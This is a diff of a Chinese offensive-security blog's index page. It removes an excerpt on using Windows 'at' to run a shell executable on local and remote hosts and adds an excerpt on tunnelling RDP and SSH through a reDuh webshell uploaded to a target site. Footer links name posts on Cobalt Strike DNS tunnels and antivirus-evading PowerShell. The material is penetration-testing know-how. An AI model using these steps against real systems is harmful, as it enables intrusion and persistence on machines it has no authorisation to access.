@@ -147,38 +147,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2016/09/24/time-tasks/">
-                win计划任务小记 [ at schtasks ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/schtasks/">schtasks</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 关于win系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></span><br><span class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></span><br></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># at \\192.168.3.23 14:23 /every:18,19,21,24,28 c:\shell.exe 在远程机器上创建计划任务</span></span><br><span class="line"><span class="comment"># at \\192.168.3.23 /delete /y 删除远程机器上的所有的计划任务</span></span><br></pre></td></tr></table></figure>
-        </div>
-        <a href="/2016/09/24/time-tasks/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2016/09/23/strace/">
                 利用strace来跟踪 ssh 登陆密码
             </a>
@@ -479,6 +447,45 @@
 
 </div>
             
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/13/rehuh-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 Reduh ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>关于http隧道:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,所谓的http隧道[更专业的叫法 “80端口复用”],你暂时可以把它简单形象的理解成基于web端脚本实现的一个socks代理功能,只不过这个代理不用在目标端再新开一个端口而是直接复用在已有的端口(通常是web服务端口,由相应的webshell实现)上:</p>
+<p>reduh[老牌的http隧道工具,基于java,所以你需要事先装下jre]</p>
+<p>0x01 首先,把代理端[即webshell]上传到目标的网站目录中,并尝试访问,返回正常后,在本地执行:<br><img src="/img/reduh_php.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># java -jar reduhclient.jar http://目标域名/reduh.php</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_clinet.png" alt=""></p>
+<p>0x02 开始绑定端口,建立隧道<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># telnet 127.0.0.1 1010</span></span><br><span class="line">[createTunnel]要绑定到本地哪个端口上[<span class="number">8088</span>]<span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span>要绑定远程机器上的哪个端口[<span class="number">3389</span>,<span class="number">22</span>] </span><br><span class="line">[createTunnel]<span class="number">8088</span><span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">3389</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_create_tunnel.png" alt=""></p>
+<p>0x03 隧道建立成功后,即可使用 mstsc,putty 等工具连接到本地绑定的端口[此处是绑定到本地的8088],当你访问本地的8088就相当于访问目标机器的3389[你也可以换成22,以及你想代理的任何端口,前提是目标的这个端口必须先开了才行]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></span><br><span class="line">putty <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_create_tunnel_success.png" alt=""></p>
+<p>关于reduh:<br>&nbsp;&nbsp;&nbsp;&nbsp;工具已经非常老了,应该是在很早之前,reduh的官网就已经发过相关声明,称reduh项目已经不再维护,现在已经被更好用的regerog所替代,不过,你要是实在没办法,还是可以尝试用下这个的,实际测试中,个人感觉reduh要比tunna还要好用一点,其实,所谓的好不好,跟目标实际环境和代码本身都有很大关系,这个也没必要非要分个好赖,适合自己的就是最好的,有兴趣可以仔细去详读一下工具代码<br><br></p>
+
+        </div>
+    
+
+</div>
+            
         </section>
     </div>
 </div>
@@ -521,7 +528,7 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2018/01/01/after-roding/">关于接下来的路</a>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
             </li>
             
             <li>
@@ -529,11 +536,11 @@
             </li>
             
             <li>
-                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+                <a class="footer-post" href="/2017/12/26/modify-webshell/">实时精准侦测站点目录中的各类 webshell</a>
             </li>
             
         </ul>
@@ -547,11 +554,11 @@
     <ul>
         
         <li>
-            <a class="footer-post" href="/categories/privilege/">privilege</a>
+            <a class="footer-post" href="/categories/接下来的路/">接下来的路</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+            <a class="footer-post" href="/categories/privilege/">privilege</a>
         </li>
         
         <li>
